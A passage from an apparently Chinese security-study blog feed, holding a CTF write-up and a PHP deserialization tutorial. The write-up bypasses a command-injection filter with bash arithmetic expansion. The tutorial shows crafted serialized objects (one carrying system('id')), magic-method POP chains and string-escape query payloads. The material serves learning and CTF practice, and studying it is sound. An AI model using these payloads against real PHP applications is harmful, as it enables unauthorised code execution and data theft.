class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>解题思路：</p><p>未过滤$、取反~和左右括号()，提示flag在36.php中，文件名为数字，且程序会直接cat到指定文件内容，需要给c赋值为36。</p><p>可使用Bash shell中的双小括号(())来进行构造数字：</p><ul><li>$(()) 代表一次运算，括号内可以填入运算式，因为里面为空，所以结果会被解析为0</li><li>对0取反可以得到-1，使用表达式表示为$(( ~$(()) ))</li><li>两个双小括号运算符相连，默认为相加，如$(( $(~$(())) $(( ~$(()))) )) ，-1+(-1)&#x3D;-2</li><li>通过上述方法我们可以构造出-37，又-37取反得到36，目的达成，在$(( ~$((    )) ))中放入37个$(( ~$(()) ))，即可构造出数字36</li></ul><p>python脚本得到payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">payload = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((&#123;&#125;))))&quot;</span>.format(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))&quot;</span>*<span class="hljs-number">37</span>)<br>print(payload)<br><br><span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))))))<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>类是对象的抽象，而对象是类的具体实例。</p><p>类是想法，把类实例化（new），调用具体值就变成了对象。</p><h2 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h2><p>类：定义类名、定义成员变量（属性）、定义成员函数（方法）</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class_Name</span></span>&#123;<br>//成员变量声明<br>//成员函数声明<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类的内容"><a href="#类的内容" class="headerlink" title="类的内容"></a>类的内容</h2><p>创建一个类：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hero</span></span>&#123;//定义类（类名）<br>var <span class="hljs-variable">$name</span>;<span class="hljs-regexp">//</span>声明成员变量<br>var <span class="hljs-variable">$sex</span>;<span class="hljs-regexp">//</span>var为一种修饰符<br>function jineng(<span class="hljs-variable">$var1</span>)&#123;<span class="hljs-regexp">//</span>声明成员函数（方法）<br>echo <span class="hljs-variable">$this</span>-&gt;name;<span class="hljs-regexp">//</span>使用预定义<span class="hljs-variable">$this</span>调用成员变量<br>echo <span class="hljs-variable">$var1</span>;<span class="hljs-regexp">//</span>成员函数传参<span class="hljs-variable">$var1</span>可直接调用<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="实例化和赋值"><a href="#实例化和赋值" class="headerlink" title="实例化和赋值"></a>实例化和赋值</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hero</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var1</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$cyj</span>= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">hero</span>()<span class="hljs-comment">//实例化类hero()为对象cyj</span><br><span class="hljs-variable">$cyj</span>-&gt;name=<span class="hljs-string">&#x27;chengyaojin&#x27;</span>;   <span class="hljs-comment">//参数赋值</span><br><span class="hljs-variable">$cyj</span>-&gt;sex=<span class="hljs-string">&#x27;man&#x27;</span>;            <br><span class="hljs-variable">$cyj</span>-&gt;<span class="hljs-title function_ invoke__">jineng</span>(<span class="hljs-string">&#x27;zuofan&#x27;</span>);     <span class="hljs-comment">//调用函数 </span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$cyj</span>);              <span class="hljs-comment">//打印对象cyj</span><br></code></pre></td></tr></table></figure><h2 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h2><p>在类中直接声明的变量称为成员属性（也可以成为成员变量）。</p><p>可以在类中声明多个变量，即”对象”中可以有多个成员属性，每个变量都存储”对象”不同的属性信息</p><p><strong>访问权限修饰符：对属性的定义</strong></p><p><strong>常用的访问权限修饰符：</strong></p><ul><li><code>pubilc</code>：公共的，在类的内容、子类中或者类的外部都可以使用，不受限制;</li><li><code>protected</code>：受保护的，在类的内部、子类中可以使用，但不能再类的外部使用;</li><li><code>private</code>：私有的，只能在类的内部使用，在类的外部或者子类中都无法使用</li></ul><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png"></p><h2 id="类的成员方法"><a href="#类的成员方法" class="headerlink" title="类的成员方法"></a>类的成员方法</h2><p>在类中定义的函数被称为成员方法</p><p>函数实现的是某个独立的功能;</p><p>成员方法实现的是类中的一个行为，是类的一部分</p><p>可以在类中声明多个成员方法，成员方法的声明和函数声明完全一样，只不过在声明成员方法时可以在function关键字前加一些访问权限修饰符，如public、protected、private（可以省略，默认为public）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Students</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$sex</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$school</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Read</span>(<span class="hljs-params"></span>)</span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Listen</span>(<span class="hljs-params"></span>)</span>&#123;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。</p><img src="/master/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/PHP反序列化-2.png" style="zoom: 50%;"><p>将对象或者数组转化为可储存&#x2F;传输的字符串。</p><p>在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示</p><p>表达方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所有格式第一位都是数据类型的英文字母简写。</p><p><strong>注意：后面一定要加<code>;</code>这才是序列化完整的表达方式</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png"></p><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png"></p><p>a对应array即数组，3对应数组内参数的数量</p><p>i:0对应编号第0位即”benben”，s对应string字符串，6对应有6个字符，”benben”即内容</p><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png"></p><p>序列化后的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;pub&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>不能序列化类，可以序列化对象</li><li>只序列化成员变量，不序列化成员函数</li></ul><hr><p><strong>private私有属性序列化时，在变量名前加”%00类名%00”</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png"></p><p><strong>%00是url编码，ascii编码为空，二进制的00</strong></p><p><strong>一般在输出序列化格式时要先转换成url编码</strong></p><p>echo urlencode(serialize($a));</p><p>序列化后的内容：</p><p>00隔开，’pub’时’test’的私有属性</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;0testpub0&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><hr><p><em><em>protected受保护属性序列化时，在变量名前加%00</em>%00</em>*</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png"></p><hr><p><strong>对象调用另一个对象的序列化</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png"></p><p><strong>test2类在实例化时，将其中成员属性$ben又被赋值成了test实例化后的对象</strong></p><p><strong>序列化的对象中包含一个序列化的对象</strong></p><p>下面的操作和上面序列化后输出的结果相同</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9.png"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li><strong>反序列化之后的内容为一个对象</strong></li><li><strong>反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关</strong></li><li><strong>反序列化不触发类的成员方法；需要调用方法才能触发</strong></li></ol><h2 id="反序列化的作用"><a href="#反序列化的作用" class="headerlink" title="反序列化的作用"></a>反序列化的作用</h2><p>将序列化后的参数还原成实例化的对象</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10.png"></p><p><strong>注意：反序列化后的对象是不存在成员方法的，需要调用类的方法才能触发</strong></p><h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p><strong>反序列化漏洞的成因：反序列化过程中，unserialize（）接收的值（字符串）可控的，通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值。</strong></p><p><strong>通过调用方法，触发代码执行</strong></p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-11.png"></p><p><strong>手动构造序列化字符串：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&quot;</span>id<span class="hljs-string">&quot;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p><strong>魔术方法：</strong></p><p><strong>一个预定义好的，在特定情况下自动触发的行为方法。</strong></p><p><strong>作用：</strong></p><p><strong>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</strong></p><p><strong>魔术方法相关机制（即魔术方法学习的重要四点）</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12.png"></p><p><strong>需要掌握的一些魔术方法：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13.png"></p><h2 id="construct和-destruct"><a href="#construct和-destruct" class="headerlink" title="__construct和__destruct()"></a>__construct和__destruct()</h2><p><strong>__construct()</strong></p><p>构造函数，在实例化一个对象时，首先回去自动执行的一个方法</p><p><strong>触发时机：在实例化对象时</strong></p><p><strong>功能：提前清理不必要的内容</strong></p><hr><p><strong>__destruct()</strong></p><p>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法，在方法调用时会触发一次，在反序列化时会触发一次</p><p><strong>触发时机:对象引用完成或对象被销毁</strong></p><p><strong>注意：</strong></p><ol><li><strong>实例化对象结束后，代码运行完会销毁，触发析构函数</strong></li><li><strong>在序列化过程中不会触发</strong></li><li><strong>在反序列化过程中会触发；反序列化得到的是对象，用完后会销毁，触发析构函数__destruct()</strong></li></ol><h2 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h2><p><strong>__sleep()</strong></p><p>序列化serialize()函数会检查类中是否存在一个魔术方法**__sleep()。**</p><p><strong>如果存在，该方法会先被调用，然后才执行序列化操作。</strong></p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</p><p><strong>触发时机：序列化serialize()之前</strong></p><p><strong>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</strong></p><p><strong>参数：成员属性</strong></p><p><strong>返回值：需要被序列化存储的成员属性</strong></p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14.png"></p><hr><p><strong>__wakeup</strong></p><p>unserialize()会检查是否存在一个__wakeup()方法。</p><p>如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</p><p>预先准备对象资源，返回void，常用与反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><strong>触发时机：反序列化unserialize()之前</strong></p><p>对比：</p><p>__wakeup()在反序列化unserialize()之前</p><p>__destruct()在反序列化之后</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-15.png"></p><h2 id="toString-和-invoke"><a href="#toString-和-invoke" class="headerlink" title="__toString()和__invoke()"></a>__toString()和__invoke()</h2><p>__toString()</p><p>表达方式错误导致魔术方法触发</p><p><strong>触发时机：把对象当成字符串调用</strong></p><p>常用与构造POP链</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-16.png"></p><p>把类User实体化并赋值给$test,此时$test是个对象，调用对象可以使用print_r或者var_dump。</p><p>如果使用ehco或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</p><hr><p>__invoke()</p><p>格式表达错误导致魔术方法触发</p><p><strong>触发时机：把对象当成函数调用</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-17.png"></p><h2 id="错误调用相关魔术方法"><a href="#错误调用相关魔术方法" class="headerlink" title="错误调用相关魔术方法"></a>错误调用相关魔术方法</h2><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p><strong>触发时机：调用一个不存在的方法</strong></p><p>参数：2个参数传参$arg1，$arg2</p><p>返回值：调用的不存在的方法的名称和参数</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-18.png"></p><p>$arg2是数组类型的变量，我们调用的传参即为$arg2[0]</p><hr><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p><strong>触发时机：静态调用或调用成员变量时使用的方法不存在</strong></p><p>参数：2个参数传参$arg1,$arg2</p><p>返回值：调用的不存在的方法的名称和参数</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-19.png"></p><p>静态调用：其实就是把-&gt;换成::</p><hr><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p><strong>触发时机：调用的成员属性不存在</strong></p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20.png"></p><hr><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p><strong>触发时机：给不存在的成员属性赋值</strong></p><p>参数：传参$arg1,$arg2</p><p>返回值：不存在的成员属性的名称和赋的值</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-22.png"></p><hr><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p><strong>触发时机：对不可访问或不存在的属性使用isset()或empty()时，__isset()会被调用</strong></p><p>参数：传参$arg1</p><p>返回值：不存在或不可访问的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-23.png"></p><hr><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p><strong>触发时机：对不可访问属性使用unset()时</strong></p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-24.png"></p><hr><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-25.png"></p><h2 id="魔术方法总结"><a href="#魔术方法总结" class="headerlink" title="魔术方法总结"></a>魔术方法总结</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-26.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-27.png"></p><h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫“面向属性编程”，即POP</p><p><strong>pop链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload</strong></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>POC (全称: Proof of concept) 中文译作概念验证在安全界可以理解成漏洞验证程序。Poc 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p><p>编写一段不完整的程序，获取所需要的序列化字符串</p><p>反推法：从得到flag开始反推过程，推完后再正推构造pop链</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-28.png"></p><h1 id="字符串逃逸基础"><a href="#字符串逃逸基础" class="headerlink" title="字符串逃逸基础"></a>字符串逃逸基础</h1><p><strong>反序列化分隔符</strong></p><p>在前面的字符串没有问题的情况下，;}是反序列化结束符，后面的字符串不影响正常的反序列化</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-29.png"></p><p><strong>特性：</strong></p><ol><li>成员属性数量一致</li><li>成员名称长度一致</li><li>内容长度一致</li><li>类中如果有我们构造的序列化字符串中没有的成员属性，会根据类自动补全</li></ol><p><strong>属性逃逸</strong></p><p>一般在数据先经过一次serialize再经过unserialize，在这个中阿金反序列化的字符串变多或者变少的时候才有可能存在反序列化属性逃逸。</p><h2 id="字符串减少逃逸"><a href="#字符串减少逃逸" class="headerlink" title="字符串减少逃逸"></a>字符串减少逃逸</h2><p>反序列化字符串减少逃逸：多逃逸出一个成员属性</p><p><strong>第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-30.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-31.png"></p><h2 id="字符串增多逃逸"><a href="#字符串增多逃逸" class="headerlink" title="字符串增多逃逸"></a>字符串增多逃逸</h2><p>反序列化字符串增多逃逸：构造出一个逃逸成员属性</p><p><strong>第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-32.png"></p><p>构造思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-33.png"></p><h1 id="字符串逃逸例题"><a href="#字符串逃逸例题" class="headerlink" title="字符串逃逸例题"></a>字符串逃逸例题</h1><h2 id="字符串增多逃逸例题"><a href="#字符串增多逃逸例题" class="headerlink" title="字符串增多逃逸例题"></a>字符串增多逃逸例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-34.png"></p><p>思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-35.png"></p><p>就是先构造我们要逃逸出来的字符串，然后计算字符串的长度，长度即为字符串增多的次数</p><p>比如：这里字符串有29个字符长度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span><span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;escaping&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><strong>所以构造29个’php’</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-36.png"></p><p>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?param<span class="hljs-punctuation">=</span>phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:8:&quot;</span>escaping<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="字符串减少逃逸例题"><a href="#字符串减少逃逸例题" class="headerlink" title="字符串减少逃逸例题"></a>字符串减少逃逸例题</h2><p><strong>题目：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-37.png"></p><p><strong>构造思路：</strong></p><p><strong>‘’建议吃掉，$pass的值benben可控</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-38.png"></p><p>我们每次构造的时候都可以用<code>&quot;;</code>开头，这样如果多的话直接在前面补1即可</p><p><strong>payload构造：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-39.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>ser=flagflagflagflagflagflagflagflagflagflag&amp;pass=<span class="hljs-number">1</span><span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span>benben<span class="hljs-string">&quot;;s:3:&quot;</span>vip<span class="hljs-string">&quot;;b:1;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">解析：</span><br><span class="hljs-string">pass=1&quot;</span>;xxxx这里加了个<span class="hljs-number">1</span>因为要多吃一个，我们前面生成的<span class="hljs-string">&quot;;s:4&quot;</span>pass<span class="hljs-string">&quot;;s:xx:&quot;</span>只有<span class="hljs-number">19</span>位，加个<span class="hljs-number">1</span>刚好<span class="hljs-number">20</span>位，而这里的<span class="hljs-string">&quot;;可以理解为闭合，因为前面的双引号也被吃了</span><br></code></pre></td></tr></table></figure><h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" 